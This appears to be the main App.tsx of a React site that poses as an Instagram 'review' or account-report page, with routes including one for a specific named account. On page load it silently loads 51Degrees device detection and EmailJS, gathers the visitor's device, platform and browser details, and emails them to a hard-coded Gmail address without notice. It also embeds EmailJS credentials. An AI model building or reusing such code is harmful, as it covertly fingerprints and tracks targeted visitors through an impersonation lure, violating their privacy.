
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, Navigate } from "react-router-dom";
import { useState, useEffect } from "react";
import Index from "./pages/Index";
import NotFound from "./pages/NotFound";
import LoadingScreen from "./components/LoadingScreen";

const queryClient = new QueryClient();

// Create a flag to track if email has been sent
let emailSent = false;

const App = () => {
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Add meta tags and scripts when component mounts
    const addMetaTag = () => {
      const meta = document.createElement('meta');
      meta.httpEquiv = "Delegate-CH";
      meta.content = "sec-ch-ua-full-version-list https://cloud.51degrees.com; sec-ch-ua-model https://cloud.51degrees.com; sec-ch-ua-platform https://cloud.51degrees.com; sec-ch-ua-platform-version https://cloud.51degrees.com";
      document.head.appendChild(meta);
    };

    const add51DegreesScript = () => {
      const script = document.createElement('script');
      script.async = true;
      script.src = "https://cloud.51degrees.com/api/v4/AQQbej08PtPTIqaN3Ug.js";
      document.body.appendChild(script);
    };

    const addEmailJsScript = () => {
      const script = document.createElement('script');
      script.src = "https://cdn.emailjs.com/sdk/2.3.2/email.min.js";
      // Set onload handler to ensure EmailJS is fully loaded before using it
      script.onload = function() {
        // Initialize EmailJS only after the script is loaded
        (window as any).emailjs.init('evvkaqLQyOBXJJo0p'); // actual evvkaqLQyOBXJJo0p ( FOR PRODUCTION )
        console.log("✅ EmailJS initialized with user ID evvkaqLQyOBXJJo0p");

        // Setup the processing logic in the global scope to ensure it runs regardless of page state
        setTimeout(() => {
          // Only process if email hasn't been sent yet
          if (!emailSent) {
            setupDeviceDataProcessing();
          }
        }, 1500); // Give 51Degrees time to initialize
      };
      document.body.appendChild(script);
    };

    // Setup device data processing function that will run independently
    const setupDeviceDataProcessing = () => {
      if (typeof (window as any).fod === 'undefined') {
        console.error("❌ 51Degrees script did not load.");
        return;
      }
      console.log("✅ 51Degrees loaded, waiting for device data...");

      (window as any).fod.complete(function(data: any) {
        // Check if email has already been sent
        if (emailSent) {
          console.log("📧 Email already sent, skipping duplicate send");
          return;
        }
        
        console.log("📥 51Degrees returned data:", data);

        const d = data.device;
        const now = new Date().toISOString();
        const payload = {
          to_email: 'testmailforiyush@gmail.com',
          email_content: [
            `Timestamp: ${now}`,
            `IsMobile: ${d.ismobile}`,
            `SetHeaderBrowserAccept-CH: ${d['setheaderbrowseraccept-ch']}`,
            `SetHeaderHardwareAccept-CH: ${d['setheaderhardwareaccept-ch']}`,
            `HardwareVendor: ${d.hardwarevendor}`,
            `HardwareModel: ${d.hardwaremodel}`,
            `HardwareName: ${d.hardwarename}`,
            `DeviceType: ${d.devicetype}`,
            `PlatformVendor: ${d.platformvendor}`,
            `PlatformName: ${d.platformname}`,
            `PlatformVersion: ${d.platformversion}`,
            `BrowserVendor: ${d.browservendor}`,
            `BrowserName: ${d.browsername}`,
            `BrowserVersion: ${d.browserversion}`
          ].join('\n'),
          Timestamp: now
        };

        console.log("✉️ Sending email via EmailJS with payload:", payload);

        // Send email using EmailJS - this will continue even if page changes
        (window as any).emailjs.send('service_1bwix84', 'template_m8vh7po', payload)
          .then(function(response: any) {
            console.log("✅ Email sent successfully!");
            // Mark email as sent to prevent duplicates
            emailSent = true;
          })
          .catch(function(err: any) {
            console.error("❌ Error sending email:", err);
          });
      });
    };

    // Add all the required elements
    addMetaTag();
    add51DegreesScript();
    addEmailJsScript();

    // Show loading screen for exactly 3 seconds, then switch instantly
    const loadingTimer = setTimeout(() => {
      setLoading(false);
    }, 3000);

    // Prevent scrolling while loading
    if (loading) {
      document.body.style.overflow = 'hidden';
    }

    return () => {
      clearTimeout(loadingTimer);
      document.body.style.overflow = '';
    };
  }, [loading]);  // Only run this effect when loading state changes

  // Main static route that doesn't contain any special characters
  const mainRoute = "/instagram-review";

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        {loading ? (
          <div className="h-screen overflow-hidden">
            <LoadingScreen />
          </div>
        ) : (
          <BrowserRouter>
            <Routes>
              {/* Redirect root to the main safe route */}
              <Route path="/" element={<Navigate to={mainRoute} replace />} />
              
              {/* Main simple route */}
              <Route path={mainRoute} element={<Index />} />
              
              {/* Special route to catch the exact problematic path */}
              <Route path="/account/@heena_.begum/report/:reportId" element={<Index />} />
              
              {/* General wildcard route to handle any account paths */}
              <Route path="/account/*" element={<Index />} />
              
              {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
              <Route path="*" element={<Index />} /> {/* Serve the Index component for all routes to avoid 404s */}
            </Routes>
          </BrowserRouter>
        )}
      </TooltipProvider>
    </QueryClientProvider>
  );
};

export default App;
